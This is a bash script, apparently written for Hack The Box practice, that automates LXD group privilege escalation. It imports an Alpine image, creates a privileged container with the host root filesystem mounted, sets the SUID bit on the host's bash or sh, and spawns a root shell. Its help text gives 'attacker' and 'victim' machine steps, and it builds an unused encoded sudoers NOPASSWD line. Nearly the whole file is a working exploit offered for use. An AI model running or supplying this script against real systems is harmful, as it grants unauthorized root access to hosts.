#!/usr/bin/env bash

#########################################################################
#### Author: David Alonso (David132435)            		     ####
#########################################################################
#### HTB profile: https://app.hackthebox.com/users/852668  	     ####
#### GitHub: https://github.com/David132435                    	     ####
#### LinkedIn: https://www.linkedin.com/in/david-alonso-21015724b/   ####
#########################################################################

################### Variables ######################

image=PWN
container=PWNED
device=pwnedevice
user=$(whoami)
base64command=$(echo "echo $user ALL=\(ALL\) NOPASSWD:ALL > /tmp/asd" | base64)
plaincommand=$(echo $base64command | base64 -d)
wherebash=$(which bash)
wheresh=$(which sh)

##################### Colors #########################

red="\e[0;91m"
blue="\e[0;94m"
yellow="\e[0;33m\033[1m"
purple="\e[0;35m\033[1m"
turquoise="\e[0;36m\033[1m"
gray="\e[0;37m\033[1m"
expand_bg="\e[K"
blue_bg="\e[0;104m${expand_bg}"
red_bg="\e[0;101m${expand_bg}"
green_bg="\e[0;102m${expand_bg}"
green="\e[0;92m"
white="\e[0;97m"
bold="\e[1m"
uline="\e[4m"
end="\e[0m"

####################### Functions #########################

function banner(){
echo -e "\n${green}${bold}|---------------------------- LXD GROUP PRIVILEGE ESCALATION ----------------------------|"
echo -e "|                         Made  by:${end}  ${white}${bold} David  Alonso  (David132435)  ${end}${green}${bold}                     |"
echo -e "|----------------------------------------------------------------------------------------|${end}"
}

function help(){
banner
sleep 0.05
echo -e "\n\t\t\t\t${yellow}${bold}Usage: ${end}${white}${bold}${uline}./lxdprivesc.sh -f alpine.tar.gz${end}"
echo -e ""
sleep 0.05
echo -e "${green}${bold}----------------------------------------- OPTIONS ----------------------------------------${end}\n"
echo -e " ${blue}${bold}\t    --file,    -f${end} ${white}${bold}<alpine image>    ${end}${end}${purple}-->${end}    ${white}${bold}Alpine Image (Rquired)${end}"
echo -e " ${blue}${bold}\t    --help,    -h${end}                   ${purple}-->${end}    ${white}${bold}Show this help pannel${end}"
echo -e " ${blue}${bold}\t    --clean,   -c${end}                   ${purple}-->${end}    ${white}${bold}Clean the containers${end}"
echo -e " ${blue}${bold}\t    --howto,   -ht${end}                  ${purple}-->${end}    ${white}${bold}How to build alpine image${end} "
echo -e ""

}

function howto(){
sleep 0.5
echo -e ""
echo -e "${green}${bold}------------------------------- HOW TO BUILD ALPINE IMAGE --------------------------------${end}\n"
echo -e "            ${turquoise} â†“   â†“   To build the Alpine Image follow these steps   â†“   â†“${end}"
sleep 0.5
echo -e ""
echo -e ""
echo -e "${red_bg}${bold}              --------------  (On the Attacker's Machine)   --------------${end}"
echo -e ""
echo -e "${yellow}[1]${end}${turquoise} ->${end}${turquoise} Download build-alpine with the command:${end}"
echo -e "${green} wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine${end}"
sleep 0.2
echo -e ""
echo -e "${yellow}[2] ${end}${turquoise}->${end}${turquoise} Run build alpine as ${end}${red}${bold}root${end}${turquoise} user (otherwise, it won't let you do it)"
echo -e "${green} bash build-alpine      # (Sometimes it doesn't work the first time, if so try again)"
sleep 0.2
echo -e ""
echo -e "${yellow}[3]${end}${turquoise} -> Transfer this script and the alpine image to the victim's machine"
sleep 0.5
echo -e ""
echo -e ""
echo -e "${blue_bg}${bold}             --------------   (On the Victim's Machine)   -----------------${end}"
echo -e ""
echo -e "${yellow}[4]${end}${turquoise} -> Execute the script:${end}"
echo -e "${green}./lxdprivesc.sh -f alpine.tar.gz"
sleep 0.2
echo -e ""
echo -e "${yellow}[5]${end}${turquoise} -> Enjoy :)${end}"
echo -e ""
}

function getshell(){
echo -e "\n${yellow}[*]${end}${purple} Trying to get a shell inside the container...${end}\n"
sleep 5
lxc exec $container bash || lxc exec $container sh
}

function imagechecker(){

echo -e "\n${green}${bold}------------------------------------- CHECKING IMAGE -------------------------------------\n"
sleep 2

if [ ! -f "$alpine_image" ];then
	echo -e "${red}${bold}[!] ERROR: $alpine_image No image specified or PATH to it is not correct.${end}\n"
	exit 1
else
	if [[ "$alpine_image" == *.tar.gz ]]; then
		echo -e "${yellow}${bold}[+]${end} ${turquoise}The Alpine image exists! Starting script...${end}"
		sleep 1
	else
		echo -e "${red}${bold}[!] The file specified does not match the file needed. Correct format ->${end}${white}${bold} *.tar.gz${end}"

		exit 1
	fi
fi
}


function exploit(){

echo -e "\n${green}${bold}--------------------------------- CHECKING PERMISSIONS  ----------------------------------\n"

# lxc command check
echo -e "${yellow}[-]${end}${turquoise} Checking that you can run lxc command...${end}"
sleep 4
lxc list &>/dev/null

if [ $? -eq 0 ]; then
	echo -e "${yellow}[+]${end} ${turquoise}You can run${end} ${gray}lxc${end}${turquoise} commmand!${end}\n"
	sleep 3
else
	echo -e "\n${red}${bold}[!] There was an error while trying to run${end}${gray} lxc${end}${red}${bold} command. You can see the problem here:$end"
	lxc list
	exit 1

fi

# lxd command check

echo -e "${yellow}[-]${end}${turquoise} Checking that you can run lxd command...${end}"
sleep 4
lxd init --auto &>/dev/null

if [ $? -eq 0 ]; then
        echo -e "${yellow}[+]${end} ${turquoise}You can run${end} ${gray}lxd${end}${turquoise} commmand!${end}"
else
        echo -e "${red}${bold}[!] There was an error while trying to run${end}${gray} lxd${end}${red}${bold} command. You can see the problem here:$end"
        lxd init --auto
        exit 1
fi

echo -e "\n${green}${bold}----------------------------------- CREATING CONTAINER -----------------------------------\n"
sleep 3

echo -e "${yellow}[+]${end} ${purple}Starting Privilege Escalation :)${end}"
lxc image import $alpine_image --alias $image &>/dev/null
sleep 1

echo -e "${yellow}[+]${end} ${turquoise}Image imported succesfully${end}"
lxd init --auto &>/dev/null

echo -e "${yellow}[-]${end} ${turquoise}Running image with name${end}${purple} ->${end}${gray} $image${end}"
lxc init $image $container -c security.privileged=true &>/dev/null
sleep 5

echo -e "${yellow}[-]${end} ${turquoise}Container created, mounting system...${end}"
lxc config device add $container $device disk source=/ path=/mnt/root recursive=true &>/dev/null
sleep 2

echo -e "${yellow}[-]${end} ${turquoise}Starting the container with name${end}${purple} ->${end} ${gray}$container...${end}"
lxc start $container &>/dev/null
sleep 5

echo -e "\n${green}${bold}--------------------------------- CHANGING PERMISSIONS  ----------------------------------\n"
sleep 2

echo -e "${yellow}[-]${end}${purple} Looking for a shell...${end}"
sleep 4


if [ -z "$wherebash" ]; then
	echo -e "${red}${bold}[!] Shell${end} ${gray}bash${end}${red}${bold} not found in the system, trying with${end}${gray} sh${end}${red}${bold}..."
	sleep 5
	if [ -z "$wheresh" ]; then
		echo -e "${red}${bold}[!] Shell${end} ${gray}sh${end} ${red}${bold}not found in the system. Dropping into a shell inside the container...${end}"
		sleep 5
		getshell
	else
		echo -e "${yellow}[+]${end} ${gray}sh ${end}${purple}found at ${end}${gray}$wheresh${end}"
		sleep 4
		echo -e "${yellow}[-]${end}${purple} Changing permissions of${end} ${gray}$wheresh${end} ${purple}to make it${red}${bold} SUID${end}"
		sleep 4
		lxc exec $container chmod u+s /mnt/root$wheresh &>/dev/null

		if [ $? -eq 0 ]; then
        		echo -e "${yellow}[+]${end}${purple} Privilege Escalated Succesfully!${end}"
        		sleep 4
			echo -e "\n${yellow}[*]${end}${purple} Prompting shell...${end}\n"
			sleep 6
			sh -p &
			sudo sh
		else
        		echo -e "${red}${bold}[!] Could not execute${end} ${gray}chmod u+s /mnt/root$wheresh${end}"
        		sleep 3
			echo -e "${red}${bold}[!] ERROR ${end}${purple}->${end}`lxc exec $container chmod u+s /mnt/root$wheresh`"
			sleep 3
			getshell
		fi


	fi

else
	echo -e "${yellow}[+]${end} ${gray}Bash ${end}${purple}found at ${end}${gray}$wherebash${end}"
	sleep 4
	echo -e "${yellow}[-]${end}${purple} Changing permissions of${end} ${gray}$wherebash${end} ${purple}to make it${red}${bold} SUID${end}"
	lxc exec $container chmod u+s /mnt/root$wherebash &>/dev/null
	sleep 5

if [ $? -eq 0 ]; then
	echo -e "${yellow}[+]${end}${purple} Privilege Escalated Succesfully!${end}"
	sleep 4
	echo -e "\n${yellow}[*]${end}${purple} Prompting shell...${end}\n"
	sleep 4
	bash -p &
	sudo bash

else
	echo -e "${red}${bold}[!] Could not execute${end} ${gray}chmod u+s /mnt/root$wherebash${end}"
	echo -e "${red}${bold}[!] ERROR ${end}${purple}->${end}`lxc exec $container chmod u+s /mnt/root$wherebash`"
	sleep 3
	getshell
fi
fi

# After Exploited

clean
exit 0
}


function clean(){
echo -e "\n${green}${bold}----------------------------------- CLEANING CONTAINER -----------------------------------\n"
echo -e "${yellow}[*]${end} ${turquoise}Cleaning container and image...${end}"
(lxc stop $container && lxc delete $container && lxc image delete $image) >/dev/null
echo -e "${yellow}[+]${end} ${purple}Done${end}\n"
}


################### PROGRAM ####################

if [ "$#" -lt 1 ];then
	help
fi


for arg in "$@"; do
	case $arg in
		--clean)
		clean
		;;

		-c)
		clean
		;;

		-h)
		help
		exit 0
		;;

		--help)
		help
		exit 0
		;;

		--file)
		banner
		alpine_image=$2
		imagechecker
		exploit
		;;

		-f)
		banner
		alpine_image=$2
		imagechecker
		exploit
		;;

		--howto)
		howto
		;;

		-ht)
		howto
		;;

		*)
		echo -e ""
		echo -e "${red}${bold}[!] Unknown option${end}${gray} $arg${end}${red}${bold}. Check help:${end}"
		echo -e ""
		help
		;;

esac
done

# Hello! :)
